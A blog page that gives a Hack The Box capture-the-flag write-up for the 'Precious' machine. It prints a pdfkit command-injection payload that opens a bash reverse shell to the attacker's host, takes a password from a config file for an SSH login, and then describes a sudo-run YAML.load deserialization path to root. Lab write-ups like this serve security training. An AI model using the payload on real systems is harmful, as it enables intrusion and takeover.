<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Hack The Box - Precious [Easy] | 0x73796C31</title><meta name=keywords content><meta name=description content="We begin with a simple web page that has an input, apparently this input turns a webpage to a PDF, I tried with hosting a page on my machine and tried to use it for the input.
Then the website provided me with a PDF of the website that I&rsquo;ve hosted, I&rsquo;ve downloaded the PDF and used the exiftool to figure out what was generating this PDF file, from there I saw that it was generated by pdfkit v0."><meta name=author content="Dimitar Ganev"><link rel=canonical href=https://sy1.sh/writeups/htb-precious/><link crossorigin=anonymous href=/assets/css/stylesheet.f8c2ee4fde28779dff9afcd3046f6bd6fc9cbeb1ddf60d48a81b676d7162c1bb.css integrity="sha256-+MLuT94od53/mvzTBG9r1vycvrHd9g1IqBtnbXFiwbs=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://sy1.sh/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://sy1.sh/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://sy1.sh/favicon-32x32.png><link rel=apple-touch-icon href=https://sy1.sh/apple-touch-icon.png><link rel=mask-icon href=https://sy1.sh/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Hack The Box - Precious [Easy]"><meta property="og:description" content="We begin with a simple web page that has an input, apparently this input turns a webpage to a PDF, I tried with hosting a page on my machine and tried to use it for the input.
Then the website provided me with a PDF of the website that I&rsquo;ve hosted, I&rsquo;ve downloaded the PDF and used the exiftool to figure out what was generating this PDF file, from there I saw that it was generated by pdfkit v0."><meta property="og:type" content="article"><meta property="og:url" content="https://sy1.sh/writeups/htb-precious/"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2023-03-12T19:42:27+03:00"><meta property="article:modified_time" content="2023-03-12T19:42:27+03:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Hack The Box - Precious [Easy]"><meta name=twitter:description content="We begin with a simple web page that has an input, apparently this input turns a webpage to a PDF, I tried with hosting a page on my machine and tried to use it for the input.
Then the website provided me with a PDF of the website that I&rsquo;ve hosted, I&rsquo;ve downloaded the PDF and used the exiftool to figure out what was generating this PDF file, from there I saw that it was generated by pdfkit v0."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Writeups","item":"https://sy1.sh/writeups/"},{"@type":"ListItem","position":3,"name":"Hack The Box - Precious [Easy]","item":"https://sy1.sh/writeups/htb-precious/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Hack The Box - Precious [Easy]","name":"Hack The Box - Precious [Easy]","description":"We begin with a simple web page that has an input, apparently this input turns a webpage to a PDF, I tried with hosting a page on my machine and tried to use it for the input.\nThen the website provided me with a PDF of the website that I\u0026rsquo;ve hosted, I\u0026rsquo;ve downloaded the PDF and used the exiftool to figure out what was generating this PDF file, from there I saw that it was generated by pdfkit v0.","keywords":[],"articleBody":"We begin with a simple web page that has an input, apparently this input turns a webpage to a PDF, I tried with hosting a page on my machine and tried to use it for the input.\nThen the website provided me with a PDF of the website that I’ve hosted, I’ve downloaded the PDF and used the exiftool to figure out what was generating this PDF file, from there I saw that it was generated by pdfkit v0.8.6.\nI went to google to check if there are any exploits and I found this:\nhttps://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795 This apparently gives me a command injection exploit, and I tried the following payload:\nhttp://myip:8080/?name=#{'%20`bash -c \"bash -i \u003e\u0026 /dev/tcp/myip/myport 0\u003e\u00261\"`'} Flag 1 This gave me a reverse shell for the user ruby, from this point I’ve run linpeas.sh to check how can I gain access to the user henry and I saw the file /home/ruby/.bundle/config and I went to check it.\n$ cat /home/ruby/.bundle/config --- BUNDLE_HTTPS://RUBYGEMS__ORG/: \"henry:\" I gained access to the user with an ssh login to the hnery user and gained the user.txt flag located in the home directory.\nFlag 2 henry@precious:~$ sudo -l Matching Defaults entries for henry on precious: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User henry may run the following commands on precious: (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb This gives the clue of how to get the next flag, let’s look what this file contains:\n# Compare installed dependencies with those specified in \"dependencies.yml\" require \"yaml\" require 'rubygems' # TODO: update versions automatically def update_gems() end def list_from_file YAML.load(File.read(\"dependencies.yml\")) end def list_local_gems Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]} end gems_file = list_from_file gems_local = list_local_gems gems_file.each do |file_name, file_version| gems_local.each do |local_name, local_version| if(file_name == local_name) if(file_version != local_version) puts \"Installed version differs from the one specified in file: \" + local_name else puts \"Installed version is equals to the one specified in file: \" + local_name end end end end We have YAML.load(File.read(\"dependencies.yml\")) which hints that we need to use the dependancies.yml file to gain root.\nUsing google again to see how can we do that, this took me some time, but figuring out the attack surface is what is this all about. The attack surface is being the YAML loader, so I’ve tried to look for exploits there, and I found this:\nhttps://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/ I executed the /usr/bin/ruby /opt/update_dependencies.rb command with sudo and then using the bash -p I gained the root access.\n","wordCount":"402","inLanguage":"en","datePublished":"2023-03-12T19:42:27+03:00","dateModified":"2023-03-12T19:42:27+03:00","author":{"@type":"Person","name":"Dimitar Ganev"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://sy1.sh/writeups/htb-precious/"},"publisher":{"@type":"Organization","name":"0x73796C31","logo":{"@type":"ImageObject","url":"https://sy1.sh/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://sy1.sh accesskey=h title="0x73796C31 (Alt + H)">0x73796C31</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://sy1.sh/posts/ title=Archive><span>Archive</span></a></li><li><a href=https://sy1.sh/cv title=CV><span>CV</span></a></li><li><a href=https://sy1.sh/writeups/ title=Write-ups><span>Write-ups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://sy1.sh>Home</a>&nbsp;»&nbsp;<a href=https://sy1.sh/writeups/>Writeups</a></div><h1 class=post-title>Hack The Box - Precious [Easy]</h1><div class=post-meta><span title='2023-03-12 19:42:27 +0300 +0300'>March 12, 2023</span>&nbsp;·&nbsp;2 min</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#flag-1 aria-label="Flag 1">Flag 1</a></li><li><a href=#flag-2 aria-label="Flag 2">Flag 2</a></li></ul></div></details></div><div class=post-content><p>We begin with a simple web page that has an input, apparently this input turns a webpage to a PDF, I tried with hosting a page on my machine and tried to use it for the input.</p><p>Then the website provided me with a PDF of the website that I&rsquo;ve hosted, I&rsquo;ve downloaded the PDF and used the <code>exiftool</code> to figure out what was generating this PDF file, from there I saw that it was generated by <code>pdfkit v0.8.6</code>.</p><p>I went to google to check if there are any exploits and I found this:</p><ul><li><a href=https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795>https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795</a></li></ul><p>This apparently gives me a command injection exploit, and I tried the following payload:</p><pre tabindex=0><code>http://myip:8080/?name=#{&#39;%20`bash -c &#34;bash -i &gt;&amp; /dev/tcp/myip/myport 0&gt;&amp;1&#34;`&#39;}
</code></pre><h1 id=flag-1>Flag 1<a hidden class=anchor aria-hidden=true href=#flag-1>#</a></h1><p>This gave me a reverse shell for the user <code>ruby</code>, from this point I&rsquo;ve run <code>linpeas.sh</code> to check how can I gain access to the user <code>henry</code> and I saw the file <code>/home/ruby/.bundle/config</code> and I went to check it.</p><pre tabindex=0><code>$ cat /home/ruby/.bundle/config
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: &#34;henry:&lt;passwod&gt;&#34;
</code></pre><p>I gained access to the user with an ssh login to the <code>hnery</code> user and gained the <code>user.txt</code> flag located in the home directory.</p><h1 id=flag-2>Flag 2<a hidden class=anchor aria-hidden=true href=#flag-2>#</a></h1><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>henry@precious:~$ sudo -l
</span></span><span class=line><span class=cl>Matching Defaults entries <span class=k>for</span> henry on precious:
</span></span><span class=line><span class=cl>    env_reset, mail_badpass, <span class=nv>secure_path</span><span class=o>=</span>/usr/local/sbin<span class=se>\:</span>/usr/local/bin<span class=se>\:</span>/usr/sbin<span class=se>\:</span>/usr/bin<span class=se>\:</span>/sbin<span class=se>\:</span>/bin
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>User henry may run the following commands on precious:
</span></span><span class=line><span class=cl>    <span class=o>(</span>root<span class=o>)</span> NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
</span></span></code></pre></div><p>This gives the clue of how to get the next flag, let&rsquo;s look what this file contains:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=c1># Compare installed dependencies with those specified in &#34;dependencies.yml&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>require</span> <span class=s2>&#34;yaml&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>require</span> <span class=s1>&#39;rubygems&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># TODO: update versions automatically</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>update_gems</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=k>end</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>list_from_file</span>
</span></span><span class=line><span class=cl>    <span class=no>YAML</span><span class=o>.</span><span class=n>load</span><span class=p>(</span><span class=no>File</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=s2>&#34;dependencies.yml&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=k>end</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>list_local_gems</span>
</span></span><span class=line><span class=cl>    <span class=no>Gem</span><span class=o>::</span><span class=no>Specification</span><span class=o>.</span><span class=n>sort_by</span><span class=p>{</span> <span class=o>|</span><span class=n>g</span><span class=o>|</span> <span class=o>[</span><span class=n>g</span><span class=o>.</span><span class=n>name</span><span class=o>.</span><span class=n>downcase</span><span class=p>,</span> <span class=n>g</span><span class=o>.</span><span class=n>version</span><span class=o>]</span> <span class=p>}</span><span class=o>.</span><span class=n>map</span><span class=p>{</span><span class=o>|</span><span class=n>g</span><span class=o>|</span> <span class=o>[</span><span class=n>g</span><span class=o>.</span><span class=n>name</span><span class=p>,</span> <span class=n>g</span><span class=o>.</span><span class=n>version</span><span class=o>.</span><span class=n>to_s</span><span class=o>]</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>end</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>gems_file</span> <span class=o>=</span> <span class=n>list_from_file</span>
</span></span><span class=line><span class=cl><span class=n>gems_local</span> <span class=o>=</span> <span class=n>list_local_gems</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>gems_file</span><span class=o>.</span><span class=n>each</span> <span class=k>do</span> <span class=o>|</span><span class=n>file_name</span><span class=p>,</span> <span class=n>file_version</span><span class=o>|</span>
</span></span><span class=line><span class=cl>    <span class=n>gems_local</span><span class=o>.</span><span class=n>each</span> <span class=k>do</span> <span class=o>|</span><span class=n>local_name</span><span class=p>,</span> <span class=n>local_version</span><span class=o>|</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=n>file_name</span> <span class=o>==</span> <span class=n>local_name</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span><span class=p>(</span><span class=n>file_version</span> <span class=o>!=</span> <span class=n>local_version</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=nb>puts</span> <span class=s2>&#34;Installed version differs from the one specified in file: &#34;</span> <span class=o>+</span> <span class=n>local_name</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span>
</span></span><span class=line><span class=cl>                <span class=nb>puts</span> <span class=s2>&#34;Installed version is equals to the one specified in file: &#34;</span> <span class=o>+</span> <span class=n>local_name</span>
</span></span><span class=line><span class=cl>            <span class=k>end</span>
</span></span><span class=line><span class=cl>        <span class=k>end</span>
</span></span><span class=line><span class=cl>    <span class=k>end</span>
</span></span><span class=line><span class=cl><span class=k>end</span>
</span></span></code></pre></div><p>We have <code>YAML.load(File.read("dependencies.yml"))</code> which hints that we need to use the <code>dependancies.yml</code> file to gain root.</p><p>Using google again to see how can we do that, this took me some time, but figuring out the attack surface is what is this all about. The attack surface is being the YAML loader, so I&rsquo;ve tried to look for exploits there, and I found this:</p><ul><li><a href=https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/>https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/</a></li></ul><p>I executed the <code>/usr/bin/ruby /opt/update_dependencies.rb</code> command with sudo and then using the <code>bash -p</code> I gained the root access.</p></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=https://sy1.sh/writeups/htb-escape/><span class=title>« Prev</span><br><span>Hack The Box - Escape [Medium]</span></a>
<a class=next href=https://sy1.sh/writeups/htb-encoding/><span class=title>Next »</span><br><span>Hack The Box - Encoding [Medium]</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://sy1.sh>0x73796C31</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod (sy1 modified)</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>